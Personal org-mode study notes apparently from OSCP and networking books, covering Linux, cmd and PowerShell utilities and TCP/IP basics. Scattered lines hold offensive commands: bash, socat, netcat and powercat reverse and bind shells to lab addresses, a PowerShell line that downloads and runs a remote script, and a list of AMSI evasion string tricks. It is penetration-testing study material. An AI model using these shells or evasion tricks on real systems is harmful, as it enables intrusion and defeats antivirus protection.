;; -*- mode: org; eval: (company-mode -1); mode:emmet; -*-
+ Book1: CISSP_ Certified Information Systems Security Professional Study Guide   (2011, John Wiley & Sons) (788 pages)
+ Book2: GSEC GIAC Security Essentials Certification All-in-One Exam Guide (555 pages)
+ Book3: Offensive Security - Offensive Security OSCP-Offensive Security Ltd (2020) (853 pages)
+ Book4: Internet Core Protocols The Definitive Guide Help for Network Administrators by Eric Hall (424 pages)
+ Book5: Linux Administration  A Beginner’s Guide, Wale Soyinka (2016, McGraw-Hill) (802 pages)
+ Book6: Windows Internals 7ed, Part 1, User Mode, (Win 10 and Win Server 2016) by David Solomon, etc. (805 pages)
+ Book7: Windows Internals 6ed, Part 2, Developer Reference, (Win 7 and Win Server 2008 R2) by David Solomon, etc. (594 pages)
================================================================================
+ CEH v9 gitbook?

* Book3_Chapter 02 the basics
*** the linux filesystem hierachy standard(FHS)
   + /bin - basic programs (ls, cd, cat, etc.)
   + /sbin - system programs (fdisk, mkfs, sysctl, etc)
   + /etc - configuration files
   + /tmp - temporary files (typically deleted on boot)
   + /usr/bin - applications (apt, ncat, nmap, etc.)
   + /usr/share - application support and data files 

** linux shell utilities
*** the man page sections
   + the sections:
     | Section | Contents                                       |
     |---------+------------------------------------------------|
     | 1       | User Commands                                  |
     | 2       | Programming interfaces for kernel system calls |
     | 3       | Programming interfaces to the C library        |
     | 4       | Special files such as device nodes and drivers |
     | 5       | File formats                                   |
     | 6       | Games and amusements such as screen-savers     |
     | 7       | Miscellaneous                                  |
     | 8       | System administration commands                 |

  + Apart from the normal search, ~man -k keywords~: keyword search
  + ~man 5 passwd~

*** apropos [keyword]
     + searching the keyword in man page description section for possible instances.

*** mkdir -p(parent)
     + mkdir -p test/{recon,exploit,report} 

*** locate
     + sudo updatedb
     + locate sbd.exe

*** find
     + sudo find / -name sbd* 

     + *find vs locate*
       - find search, while locate use index; find is more flexible, while locate is faster.
       #+begin_quote
       The main advantage of find over locate is that it can search for files and directories by more than just the name. With find, we can search by file age, size, owner, file type, timestamp, permissions, and more.
       #+end_quote
       
*** ss -antlp
     + to dump socket statistics.
     + similar to netstat. It can display more TCP and state information than other tools. 

*** systemctl 
     + systemctl list-units
     + systemctl list-sockets
     + systemctl list-timers
     + systemctl list-dependencies
     + *systemctl list-unit-files*

*** env
     + echo $path
     + x=1 && echo $x
       - echo x //x
       - echo "x" //x
     + export x="2"
     + $$ //current shell pid

**** bash string literal
     + x=2
       - echo $((x++))
       - echo $((x + $x + x))

*** history
    + history
    + !number //or !!
    + ctrl+r //backward search
    + ctrl+s //forward search

    + //effected by 3 env params:
      - HISTSIZE //take effect immediately, numbers of commands stored in memory for the current session
      - HISTFILESIZE //numbers of commands to be stored in the .bash_history file
*** //File Descriptor
**** basic of FD
    | FD | pointer |
    |----+---------|
    | 0  | stdin   |
    | 1  | stdout  |
    | 2  | stderr  |

    + A File Descriptor (FD) is a number which refers to an open file.
      #+begin_quote
      Each process has its own private set of FDs, but FDs are inherited by child processes from the parent process.
      Every process should inherit three open FDs from its parent: *0 ("standard input")*, open for reading; and *1 ("standard output")* and *2 ("standard error")*, open for writing. A process that is started without one or more of these may behave unpredictably. (So never close stderr. Always redirect to /dev/null instead.)
      #+end_quote

    + FD 3,4, ..., 9 are for additional files, need to be open first before used. For more info see:
      - [Advanced Bash-Scripting Guide: Chapter 20. I/O Redirection.](https://tldp.org/LDP/abs/html/io-redirection.html)
      - [how do file descriptors work](https://stackoverflow.com/questions/7082001/how-do-file-descriptors-work)

      #+begin_src
      exec 5<> /tmp/foo  #open fd 5, touch foo if not exist.
      echo "1\n2\n 3456789" >&5
      exec 5>&- #close fd 3.
      cat /tmp/foo
      rm /tmp/foo
      #+end_src

**** FD, basic of redirecting
     + ~:> filename~ //truncates file "filename" to zero length, touch if not exist.
     + ~1>> filename~ //redirect and append stdout to file "filename"
     + ~M>N~ 
       - //"M" is a FD, which is defaults to 1 if not explicitly set.
       - // *"N" is a filename*.
       - //File descriptor "M" is redirect to file "N."
     + ~M>&N~
       - //"M" is a FD, which is defaults to 1 if not explicitly set.
       - // *"N" is a FD*.
       - //"M" is redirected to "N". All output of file pointed to by M gets sent to file pointed to by N.

     + 0<filename, <filename //accept input from a file "filename"
       - cat 0<filename, cat <filename //are semantically equivalent

     + ls ./nonExisting 2>error.txt
     + ls ./nonExisting 2>&1
     + wc -mwl < filename

**** advanced: the mechanisms && stdin, stdout, stderr redirecting.
     + ~bash -i >& /dev/tcp/192.168.140.1/1337 0>&1~ //the meaning.

***** the ~>&~ || ~&>~ //(if FD number is omitted):
      1. *syntax for redirecting stderr*, the 3 variants are semantically equivalent:
         - ~>& dst~
         - ~&> dst~
         - ~> dst 2>&1~ //most human readable
           #+begin_src
           strace -f bash -c 'ls a &> out' 2>&1 | grep -n dup2
           # open, 3(out) => 1(stdout)>3, (dup2(3, 1)) => 2(stderr)>1, (dup2(1, 2))
           strace -f bash -c 'ls a > out' 2>&1 | grep -n dup2
           # open, 3(out) => 1(stdout)>3, (dup2(3, 1))
           #+end_src

      2. *omitting FDs*, if:
         - ~<~ is the first character of the redirection operator: the redirection refers to FD 0(stdin) *dup2(3, 0)* //i.e. 0<fileIn
         - ~>~ is the first character of the redirection operator: the redirection refers to FD 1(stdout) *dup2(3, 1)* //i.e. 1>fileOut

***** the redirect operator: *associativity: l => r; the > operator only pass the pointer address of the FD*
      + ~ls > outFile 2>&1~ //direct both FD 2(stderr) and FD 1(stdout) to the outFile
      + ~ls 2>&1 > outFile~ //direct only FD 1(stdout) to the outFile, because the FD 2(stderr) was dumped to the FD 1 before the FD 1 goes to the outFile
      + ~strace -f bash -c 'ls 2>&1 > outFile' > ls.out 2>&1~ //dup2(oldFD, newFD)
        #+begin_src
        dup2(1, 2)         # pointer address 2 === 1
        # outFile -> 3
        dup2(3, 1)         # pointer address 1 === 3, hence stderr not included
        #+end_src
      + ~strace -f bash -c 'ls > outFile 2>&1' > lsall.out 2>&1~ //dup2(oldFD, newFD)
        #+begin_src
        # outFile -> 3
        dup2(3, 1)         # pointer address 1 === 3
        close(3)
        dup2(1, 2)         # pointer address 2 === 1, stderr included
        #+end_src

***** use the ~strace~:
      + ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~ //grep -n 192.168.140.1 strace.out, check syscalls around the line
        - //1(stdout)>3(socket) => 0(stdin)>1(stdout, socket)
        - //since the socket is bidirectional, both read and write are legal.

*** apt(Advanced Package Tool)
    + apt update: update the db info
    + apt upgrade [<packageName>]
    + apt-cache search <keyword>: search in the cached package *description* for the keyword
    + apt show <packageName>
    + apt install
    + apt remove --purge

*** dpkg
    + ~dpkg -i <package.deb>~
    + ~dpkg -l [packageName]~ //with or without packageName
    + dpkg can call apt or use offline package
     
*** grep
    + ~grep -n(--line-number) <keyword> <fileName>~ //show the line number
    + ~grep -ri <keyword> <directory>~
      - //read all files under each directory recursively, search for what matches the "keyword"
      - //i for --ignore-case 

*** <<< (here string)
    + [Here Strings](https://tldp.org/LDP/abs/html/x17837.html)
    + [what does <<< mean](https://unix.stackexchange.com/questions/80362/what-does-mean)

    + read first second <<< "hello world"
    + cat <<< "string"
    + //the tricky part is, it pass the rhs as a string, as the "stdin" of the lhs function. But not all function work with "/dev/stdin".
    + xargs kill <<< "-1 $$" //because xargs works with "stdin"

    //TODO

*** sed
    + ~sed -i.bak -e 's/sed/script/gi' fileName~ //edit --in-place, with backup fileName.bak, and --expression
    + ~echo 'sed in a shell' | sed 's/shell/subshell/g'~ //the last part is *regex flag*
      #+begin_quote
      If no ~-e script~, ~--expression=script~, ~-f script-file~, or ~--file=script-file~ option is given, then the first non-option argument is taken as the sed script to interpret. *All remaining arguments are names of input files; if no input files are specified, then the standard input is read.*
      #+end_quote

*** cut 
    + ~echo "one two, three" | cut -f 2 -d ','~ //-f for field number[ -ge 1 ], -d for the delimiter instead of the default TAB, [ $delimiter.length -eq 1 ]

*** awk
    + ~echo "one::two::three" | awk -F "::" '{print $1, $3}'~ //F to set the field separator
    + should multiple cut are involved, consider switching to awk

*** head
    + ~head -vn linesNumber file~ //if no file presented, read stdin

*** sort
    + ~sort -urn~ //unique, reverse, numeric order.
    + ~ps -ef | sort [-t [delimiter]] -k 1d,1 -k 2n,2~ // d for dictionary-order(effected by LC_ALL), n for numeric, [delimiter] could be ":" "\t" "<tab>", etc.; *must specify an end position in multiple key scenario, otherwise an option will effect the whole line*.
      #+begin_quote
      KEYDEF is F[.C][OPTS][,F[.C][OPTS]] for start and stop position, where F is a field number and C a character position in the field; both are origin 1, and the stop position defaults to the line's end.  If neither -t nor -b is in effect, characters in a field are counted from the beginning of the preceding whitespace. OPTS is one or more single-letter ordering options [bdfgiMhnRrV], which override  global  ordering  options for that key. If no key is given, use the entire line as the key. Use --debug to diagnose incorrect key usage.
      #+end_quote

*** uniq
    + ~uniq -c~ //count the number of occurrences
    + //use this after sort, since ~uniq~ only eliminate identical neighbour strings

*** comm
    + ~comm -[123] fileA fileB~ //output three columns: UniqueOfFileA UniqueOfFileB CommonOfFileAB, use -[123] to specify the column to suppress. 

*** diff
    + ~diff -c fileA fileB~ //context, in separate context
    + ~diff -u fileA fileB~ //unified format, all in one.

*** vimdiff
    + ~vimdiff fileA fileB~
      - ~do~ //diffget (o for obtain): get from the other file
      - ~dp~ //diffput: put change to the other file
      - ~]c~ //jump to the next diff
      - ~[c~ //jump to the previous diff
      - ~C-w~ //change window
    + ~:h [vimCommands]~

*** process management
    + job(linux) vs. process: ~cat error.log | wc -m~ is a pipeline of two processes, which the shell consider as a single job.

*** background tasks
    + ~ping localhost &~
    + ~ping localhost~ ~C-z~ //suspend
    + ~bg~ or ~%1 &~ //resume the suspended task at background
    + ~fg~ or ~%1~ //resume the task at foreground
    + ~%~
      - ~%Number(a job-identifier)~ //a job spec(ification), for more info check man bash.
      - ~%String~ //%ping, strings that the command job begins with.
      - ~%+~ ~%%~ //current job
      - ~%-~ //previous job
*** process control
    + ~ps aux~
    + ~ps -ef~ //every, full-format listing
    + ~ps -t 0 -f~ //0 for tty0, - for no tty
    + ~ps -ef f~ //output modifier f as --forest, ASCII art forest tree
    + ~ps -fC [commandNameLessThan15Chars]~

*** kill
    + ~kill -L~ //list kill-signal names in a nice table 
    + ~kill -l 11~ //translate number 11 into a signal name
    + ~kill -9 -1~ //send SIGKILL to almost every processes, since a PID of -1 is special, it indicates all processes except the kill process itself and init.
    + ~kill [pid|jobSpec]~ //send default signal: SIGTERM, to the process|job.

*** tail
    + ~tail -f logFile.log~ //follow the update.
    + ~tail -n[LinesToDisplay]~ //default 10 lines if not specified
  
*** watch
    + ~watch -n 5 w~ //watch the w command(who is logged on and what they are doing) with interval of 5 seconds (default 2 seconds)
    + ~watch -n 1 'ps -ef | sort -k 4nr,4 | head -n 5'~ //watch at 1 second interval for the top 5 processes that has the highest cpu usage, among all processes.

*** wget: downloads files using the HTTP/HTTPS and FTP protocols.
    + ~wget -O report_wget.pdf https://www.offensive-security.com/reports/penetr ation-testing-sample-report-2013.pdf~ // -O as --output-document

*** curl
    + ~curl -o report.pdf https://www.offensive-security.com/reports/penetration -testing-sample-report-2013.pdf~ 

*** axel: FTP/HTTP/HTTPS download accelerator, use multiple connections
    + ~axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/repor ts/penetration-testing-sample-report-2013.pdf~

*** bash ENV variables: see ~man bash~
    + ~HISTCONTROL=ignoredups~

*** netcat //has several versions: nmap-ncat, nc
    + //the original version, ~nc -h ==> [v1.10-46]~
    + ~nc -[u]nlvp 1337 --allow 192.168.140.0/24~ //[u]dp, verbose, nodns, listening, port, allow access from a local network only.
    + ~nc -[u]nv 127.0.0.1 1337~
    + ~nc -znv[u] [ip] 1-100~ //(stealth)scan for listening daemons without sending any data to them. 
    + ~nc -nlvp 1337 > fileReceived~
    + ~nc -nv 127.0.0.1 1337 < fileToSend~
    + ~nc -nlvp 1337 < fileAvailable~
    + ~nc -nv 127.0.0.1 1337 > fileDownloaded~
    + //the nmap maintained version, ~ncat -h ==> [Ncat 7.91 (...nmap.org/ncat)]~: ipv6 support, ssl, etc.
    + ~nc -e cmd.exe --allow [ip] -vnlp 1337 --ssl~ //ssl
    + ~nc -vn [ip] 1337 --ssl~ //the nmap ver. ncat ssl connection
    //TODO TCP handshaking and attack vector.(SYN -> SYN/ACK -> ACK)

**** TODO stealth scan (gsec stealth port scanning methods 1985)
    //TODO how nc stealth scan work. (wireshark) (it is definitely not stealth: it break nc listening process.)
    + Inverse Mapping
    + Half Open Scan //scanner SYN, target SYN/ACK, scanner RST
    + FIN Scan //FIN on, closed port send RST, open port ignore the packet
    + Xmas Tree Scan //FIN URG PSH on, or all flags on? same as FIN
    + Null Scan //all flags off, same as FIN
    + //FIN, Xmas, Null scan does not work on Windows family/Cisco, HP/UX, IRIX, since they use somewhat different implementation which deviate from the standard.

*** ip
    + ~ip l(ink) show [device]~
    + ~ip a(ddress) show [device]~
    + ~ip r(oute) show~
    + ~ip link set device { up | down | arp { on | off } }~

**** ~ip neigh~ //RFC 4861, neighbor discovery && ipv6 slaac
    - *NS(neighbor solicitation)*: msg.dst === *solicited-node multicast address*
    - *NA(neighbor advertisement)*: the neighbor response with lladdr
    - *RS(router solicitation)*: msg.src === self generated link-local; msg.dst === ff02::2( *all router multicast address* )
    - *RA(router advertisement)*: msg.src === fe80::x(router link-local); msg.dst === ipv6 unicast address of the requester || ff02::1 ( *all nodes multicast address* )

***** *ipv6 slaac* (IPv6 Stateless Address Autoconfiguration)
      1. the device calculate a EUI-64 or random link-local address for itself, say *addrD*
      2. the device perform Duplicate Address Detection(DAD) by sending a *NS* message, in which, src = ::/128(unspecified address), dst = $addrD
      3. confirming no conflict, the device send a *RS* message, in which, src = $addrD, dst = ff02::2
      4. in response, the ipv6 router unicast an *RA* message, in which, src = fe80::x(router link-local), dst = $addrD; the message also contains ipv6 prefix, with which the device configure its *Global Unicast Address* (since the prefix and link-local is always 64 bits long); the message also contains other info such as MTU.

*** socat
    + ~socat [-u|U] TCP-LISTEN:127.0.0.1:1337,fork path/to/file~ //uni-directional mode: U for right to left, u for left to right. Be careful not to override the source file.
    + ~socat tcp-connect:127.0.0.1:1337 exec:/bin/sh,stderr,pty[,setsid,sigint,sane]~ //reverse shell
    + @Deprecated //misc methods:
      - ~socat -d -d TCP4-LISTEN:443 STDOUT~ //...but why bother
      - ~socat TCP4:127.0.0.1:443 EXEC:/bin/bash~ //...use the parameterizes
      
*** openssl
    + ~openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt~
      - ~cat bind_shell.key bind_shell.crt > bind_shell.pem~
      - ~sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash,stderr,pty,setsid,sigint,sane~ //bind_shell, can be connected with nc --ssl option

*** base64 encoding decoding
    + ~echo -n 'cat' | base64 -w 0~ //echo without trailing \n, base64 encoding without auto wrapping
    + ~echo -n 'Y2F0' | base64 -d~ //decode, -i ignore garbage for more tolerance

*** TODO system call tracing, libcall tracing // man syscall
    + ~strace~
      - ~strace -f bash -c 'bash -i >& /dev/tcp/192.168.140.1/1337 0>&1' > strace.out 2>&1~ // -f: trace child processes created, as a result of the fork(2), vfork(2), and clone(2) system calls (quote: man strace). grep -n 192.168.140.1 strace.out, check syscalls around the line
    + ~ltrace -f ls~ // -f: same with strace -f.

*** cat file to variable
    #+begin_src
    var = $( cat v.txt )
    #+end_src

** TODO bash scripting
   + man bash
   + ~#!~ //the "shebang"
   + debug view: ~#!/bin/bash -x~

*** basic syntax
    + // *the dollar sign is evaluated within double quotes, but not within single quotes*
      #+begin_src
      x=1; echo $x        # variables. Note: no space 
      echo "1 + $x"       # '1 + 1'.
      echo '1 + $x'       # '1 + $x'
      y2=1+$x             # "1+1"
      #+end_src

    + // *command substitution and subshell*:
      - ~$(command)~
        #+begin_src
        user=$(whoami)
        echo $user 
        #+end_src
   
      - ~`command`~
        #+begin_src
        #!/bin/bash -x
        var1=1
        echo $var1
        var2=2
        echo $var2

        $(var1=11)        # ++ var1...
        echo $var1        # + echo 1
                          # 1
        `var2=22`         # ++ var2...
        echo $var2        # + echo 2
                          # 2
        `echo ls`         # ++ echo ls
                          # + ls
                          # fileName.sh ...
        #+end_src
      - //note: the following commands are equivalent.
        + ~`echo ls`~ 
        + ~`ls`~

*** arguments
| Sign      | Description                                      |
|-----------+--------------------------------------------------|
| $0        | argv[0]                                          |
| $1-$9     | argv[1]-argv[9]                                  |
| $#        | argc                                             |
| $@        | argv                                             |
| $?        | The exit status of the most recently run process |
| $$        | The process ID of the current script             |
| $USER     | The username of the user running the script      |
| $HOSTNAME | The hostname of the machine                      |
| $RANDOM   | A random number                                  |
| $LINENO   | The current line number in the script            |

*** ~read~ //userInput
    #+begin_src
    #!/bin/bash
    echo "y/N?"
    read answer
    echo "answer: $answer" 
    read -p 'id: ' id
    read -sp 'pw: ' pw;
    printf "\n\nid: $id, pw: $pw
    #+end_src

*** if //conditioning
    #+begin_src
    if [ <some test> ]
    then
      <actions>
    elif [ <some test> ] 
    then
      <actions>
    else
      <actions>
    fi
    #+end_src

*** TODO test operators
    | Operator              | Description: Expression True if...     |
    |-----------------------+----------------------------------------|
    | !EXPRESSION           |                                        |
    | -n STRING             | STRING length is greater than zero     |
    | -z STRING             | The length of STRING is zero (empty)   |
    | STRING1 != STRING2    |                                        |
    | STRING1 = STRING2     |                                        |
    | INTEGER1 -eq INTEGER2 |                                        |
    | INTEGER1 -ne INTEGER2 |                                        |
    | INTEGER1 -gt INTEGER2 |                                        |
    | INTEGER1 -lt INTEGER2 |                                        |
    | INTEGER1 -ge INTEGER2 |                                        |
    | INTEGER1 -le INTEGER2 |                                        |
    | -d FILE               | FILE exists and is a directory         |
    | -e FILE               | FILE exists                            |
    | -r FILE               | FILE exists and has read permission    |
    | -s FILE               | FILE exists and it is not empty        |
    | -w FILE               | FILE exists and has write permission   |
    | -x FILE               | FILE exists and has execute permission |
    
    //TODO
    
** cmd scripting

*** basic
    #+begin_src bat
    @echo off
    echo hi
    pause

    goto end
    echo 'skipped'
    :end

    @echo off 
    #+end_src

**** ~set~ //variables
     #+begin_src bat
     REM set                                  //list all existing env variables
     REM set [<variable>=[<string>]]
     REM set [/p] <variable>=[<promptString>]
     REM set /a <variable>=<expression>
    
     SETLOCAL
     SET /A a = 5  # natural
     SET /A b = 10 
     SET /A c = %a% + %b% 
     echo %c%
     ENDLOCAL
     #+end_src

**** ~for~ // no, use powershell
     + ~FOR /F "tokens=1-5" %%A IN ("This is a short sentence") DO @echo %%A %%B %%D~
     + ~FOR %%G IN (a,b,c) DO (md %%G)~ // mkdir a,b,c
     + //%% vs %, expect %% in .bat script file, expect % in a cmd prompt.

*** cat to variable
    + ~powershell -c "$v=cat file; $v"~

** cmd utilities
   + ~pathping -n ip~ //route tracing utility.
   + ~tracert ip~ //route tracing utility, less info than pathping.
   + ~netstat -an~ //display all connections and listening ports, in numerical form.
   + ~systeminfo~
   + ~tasklist /svc~ // display services hosted in each process; /v for verbose
   + ~taskkill /pid 1 /pid 2 /T~ //terminate all specified processes and their child processes; /F for forcefully end.
   + ~driverquery -v~
   + ~assoc~ //e.g. assoc .txt
   + ~ipconfig~ // /flushdns, /rebase, /renew
   + ~powercfg~ // /A list all available sleep states; /hibernate on | off; /energy 
   + ~shutdown~ // /h for hiberanate; /r /o restart to advanced start-up 
   + ~sfc /SCANNOW~ //Windows Resource Checker

** TODO powershell scripting
   + ~(Get-Host).version~
   + ~Get-Help(help)~
   + ~Set-ExecutionPolicy Unrestricted~
   + ~Get-ExecutionPolicy~
   + #!/bin/bash ~powershell -c ""~ //powershell parse syntax like $var within the parentheses while bash does not
   + ~echo ([System.Text.Encoding]::Default)~ //get system default text encoding
   + //the *square brackets*. No reference. But seems [.Net TypeName]::staticMethod is legal in powershell.

*** TODO breakpoint?

*** Base64 encoding in powershell
   + base 64 encoding
     #+begin_quote
     $txt = "こんにちは"
     $byte = ([System.Text.Encoding]::Default).GetBytes($txt)
     $b64enc = [Convert]::ToBase64String($byte)
     #+end_quote 
   + base 64 decoding
     #+begin_quote
     $b64str = "grGC8YLJgr+CzQ=="
     $b64dec = [Convert]::FromBase64String($b64str) //to 
     $byte2 = ([System.Text.Encoding]::Default).GetString($b64dec)
     #+end_quote 
    
*** basic syntax
**** $() //Subexpression operator 
     #+begin_quote
     Returns the result of one or more statements. For a single result, returns a scalar. For multiple results, returns an array. Use this when you want to use an expression within another expression.
     #+end_quote
     + ~Folder list: $((dir c:\ -dir).Name -join ', ')~ //Folder list: Program Files, Program Files (x86), Users, Windows

**** @() //Array subexpression operator
     #+begin_quote
     Returns the result of one or more statements as an array. If there is only one item, the array has only one member.
     #+end_quote
     + ~@(Get-CimInstance win32_logicalDisk)~

**** & //Call operator
     #+begin_quote
     Runs a command, script, or script block.
     #+end_quote 

     + ~$c = "get-executionpolicy"; & $c~
     + ~& "./file name with spaces.ps1"~ //invoke the .ps1 script

**** //script block
     #+begin_quote
     A script block returns the output of all the commands in the script block, either as a single object or as an array. 
     You can also specify a return value using the return keyword. The return keyword does not affect or suppress other output returned from your script block. However, the return keyword exits the script block at that line.
     #+end_quote

     + //example:
       #+begin_src
       $sb = {
           param($p1,$p2)
           $OFS=','
           "p1 is $p1, p2 is $p2, rest of args: $args"
       }
       Invoke-Command $sb -ArgumentList 1,2,3,4 //p1 is 1, p2 is 2, rest of args: 3,4 
       &$sb -p2 2 -p1 1 3 //p1 is 1, p2 is 2, rest of args: 3
       &$sb 2 1 3 //p1 is 2, p2 is 1, rest of args: 3
       #+end_src 

**** .. //range operator
     + ~1..10~
     + ~foreach ($a in 1..$max) {Write-Host $a}~
     + ~'a'..'f'~

**** $_ //delay bind operator, or "this" in foreach TODO
     + ~10..1~
     + ~5..-5 | ForEach-Object {Write-Output $_}~

**** , //comma operator
     #+begin_quote
     As a binary operator, the comma creates an array or appends to the array being created. In expression mode, as a unary operator, the comma creates an array with just one member. Place the comma before the member.
     #+end_quote

     + ~$myArray = 1,2,3~
     + ~$SingleArray = ,1~
     + ~Write-Output (,1)[0]~

**** ? //shortcut to where
     + ~1...5 | ? { $_ % 2 }~ //1 to .5 gives 1 and 0; foreach, if [ (this % 2) -ne 0 ], print this; 
      
**** -f //format operator
     #+begin_quote
     Formats strings by using the format method of string objects. Enter the format string on the left side of the operator and the objects to be formatted on the right side of the operator.
     #+end_quote
     
     + ~"{0} {1,-10} {2:N}" -f 1,"hello",[math]::pi~

*** powershell DownloadFile && *DownloadString*
    + ~powershell -c "(new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/wget.exe','./wget.exe')"~
    + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //load the remote script during the session only 

*** @Deprecated ~powercat~ //!triggers amsi
    + ~iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')~ //!triggers amsi
    + ~powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1~ //client mode, port 443, ....ps1 as input(file to be transferred)
    + ~powercat -c 10.11.0.4 -p 443 -e cmd.exe~ //reverse shell...but why bother
    + ~powercat -l -p 443 -e cmd.exe~ //bind shell...but why bother

*** amsi evasion (//"this script contains malicious content and has been blocked by your antivirus software")
     + $evil_0 = "amsicontext"
**** evasion 1: concatenation
     + $not_evil = "amsi" + "context"

**** evasion 2: type-casting
     + $not_evil = [char]97 + [char]109 + [char]115 + [char]99
     + use-a-command $not_evil
     + use-a-command ([char]97 + [char]109 + [char]115 + [char]99)

**** evasion 3: variable-insersion
     + $var = "context"
     + $not_evil = "amsi$var"

**** evasion 4: format-string
     + $not_evil = "amsi{0}{1}" -f "con","text"

**** evasion 5: string-replacement
     + $not_evil = "amsiNOTEVIL" -replace "NOTEVIL", "context"

**** TODO use encoding? 
     + simple base64 encoding now still trigger amsi || Windows virus threat protection

** utility tools
*** wireshark //for more filter info check wiki || ref
    + *capture filter*: ~net 192.168.140.0/24~
    + *display filter*: ~ip.dst==192.168.140.128 and tcp.port==1337~
    + //follow the tcp stream.
    + //TODO, practice.

*** tcpdump //TODO advanced if necessary
    + ~sudo tcpdump -r dump.pcapng | awk -F " " '{print $3}' | sort | uniq -c | head~ //find the top most frequent active address.
    + ~sudo tcpdump -n src host 192.168.140.1 and port 137 -r dump.pcapng~//n for no hostName converting.
    + ~sudo tcpdump -nX dst host 192.168.140.128 -r dump.pcapng~ //X for hex dump.
    + ~sudo tcpdump -nA dst host 192.168.140.128 -r dump.pcapng~ //A for ASCII, useful for capturing web pages.
    + ~sudo tcpdump -nA 'tcp[13]=24'~ //the 14th bytes of tcp header, i.e. the flag, with ACK and PSH on, echo "$((2#00011000))" -> decimal 24, [check man tcpdump]

**** tcpdump capture //maybe verbose
     + ~sudo tcpdump -X -s0 port 80~ //s0 raise the single package-size limit to >256kb.
     + ~sudo tcpdump -i eth0 -n -s0 -vX port 80~ //verbose

*** Fuzzer
    + AFL, libFuzzer, honggfuzz, KAFL(kernel), syscall fuzzer, syzkaller

* Book4_Chapter 01 An Introduction to TCP/IP
  
** a brief history
   + initially devices exchange info through a common communication controller 
     - ~network node -> communication controller -> network node~
   + with TCP/IP, devices could function as a network end-point

*** the internet today
   + Toplevel Internet Service Providers(ISPs)
   + Regional Internet Access Providers(IAPs)
   + End-User Nets

** TCP/IP architecture
   #+begin_quote
   TCP/IP is a collection of of protocols that range from application-specific functions like web
browsing down to the low-level networking protocols like IP and TCP.
   #+end_quote

*** OSI reference model 
    + presentation
      - other detailed transmission utility service that applications may or may not use. e.g., data-compression.
      - since it is better to have a dedicated session layer that purely manage sesions, hence separate the optional services into the presentation layer.
    + session
      - responsible for establishing, and later destroying connections between systems, applications, or users. It may receive the request from any higher layer, and then negotiate a connection using the lower layers. Once a connection is established, the layer simply provides an interface for the higher layers to communicate with.
    + transport
      - may provide reliability services usually lacking from the network layer, for basic transmission services.
    + network
      - identify the addresses of systems on the network, and the actual transmission of data between the systems.
      - must be aware of the physical nature of the network, and package the information in a format that can be further transmitted by the data-link layer.
    + data-link
      - must deal with possible physical layer error, either attempting to retransmit or report the failure to the network layer.  
    + physical
      - strict standards for the wiring systems, specifying e.g., voltage, impedance, etc.

*** TCP/IP basic
    + IP <-> OSI-network-layer
    + TCP or UDP <-> OSI-transport-layer, manage connections.
      - the session management is handled by TCP in browsing.
      - TCP/IP does not provide a formal presentation layer service(e.g. data compression) that an application *must* use, but do provide a few presentation layer service(IBM's NetBIOS, Sun's XDR) that an application *may* use.
    + ? data-link layer
      - data-link protocols are specific to wire, e.g. voltage, 
      - Media Access Control(MAC)
      - Data-Link Connection Identifier(DLCI)
        
**** Data-Link Services
     + implemented by each physical network, the implemetation might different depending on the physical medium. IP datagram is translated to a format that can be understand and delivered in the physical layer.
       
**** the Internet
     + on each local network, data-link or physical level:
       #+begin_quote
       When an IP-enabled device wants to send data to another IP node, the data-link services on that device convert the IP datagrams into a format usable by the local network medium, and then send the data to the destination system using the addressing and framing mechanisms *dictated by the network*.
       #+end_quote
     + Also, IP assume data packets are unreliable and would get lost.

**** the address resolution protocol(ARP)
     + two IP devices must locate each other's hardware addresses before any data exchange. An protocol applicapable to all physical network topology is needed.
     + ARP(who is .40?) -> Response with Hardware Address(I am .40)
      
**** the Internet Control Message Protocol(ICMP)
     + ICMP relies on IP, deliver control message backward.
     + ICMP error message are only sent when there is a detectable problem that is preventing certain packets or datagrams from being delivere due to a specific reason. It indicates that the esnding host should probably stop trying to sent those kinds of datagrams to this specific destination system, or that a different path should be used. 

**** IP datagrams vs. IP packets
     + IP datagram is a more abstract concept, while packets are what been sent in data-link layer:
       #+begin_quote
       IP datagrams get sent as IP packets, which are used to relay the IP data- grams to the destination system, one hop at a time. Although in many cases an IP datagram and an IP packet will be exactly the same, they are conceptually different entities.
       IP datagrams contain whatever data is being sent (and the associated IP headers), while IP packets are used to get the datagram to the destination system (as specified in the IP headers).
       #+end_quote

     + i.e., say: src -> router -> dst, then: src send datagrams to dst, while src send packets to router, in those packets contains datagrams.
       #+begin_quote
       These IP packets are sent using the framing mechanisms defined for the specific network medium in use on the local network, and are sub-ject to network events such as fragmentation or loss. However, the datagram itself will always remain as the original piece of data that was sent by the original sender, regardless of anything that happens to any of the packets that are used to
relay the datagram.
       #+end_quote
     + for example, a 4kb datagram being sent might be too big to fit in a simple frame for transmition in a dial-up access network, hence, the datagram might be split into four IP packets, each of which are sent as individual entities in individual frames. Then on the destination system, once all of the IP packets are received, into the original datagram they will be reassembled and processed.

**** ? nested package and header structure
     + wireshark, 
     + how is segment marked in data-link layer
     + header + data, in each layer.
       
**** ? local loopback network 
     
**** ? routing table, specify router for each destination network.
     + popular protocol popular for private networks
       - Routing Information Protocal(RIP)
       - Open Shrortest Path First(OSPF)
     + those dynamic routing protocols tends to consume a lot of CPU cycles, hence are often ran on routers instead of the host
       - set destination 0.0.0.0 <= default router(e.g., 192.168.100.100), on system boot using protocol such as BOOTP or DHCP, or protocol called Router Discorery 
          
**** ? Route aggregation Q: super route, how to separate local vs internet
     + the routing table method cost lots of resources, is not applicable to Internet.
     + address assignment scheme, separate by physical location, leave routing to ISP, only a few(50,000 routes) super-routes need to be suggested. 

**** datagram independence
     + IP networks treat every individual IP datagram as an independent entity, which means they might take whatever path that the router deems fit when forwarding the datagram.

**** datagram/packet intergrity
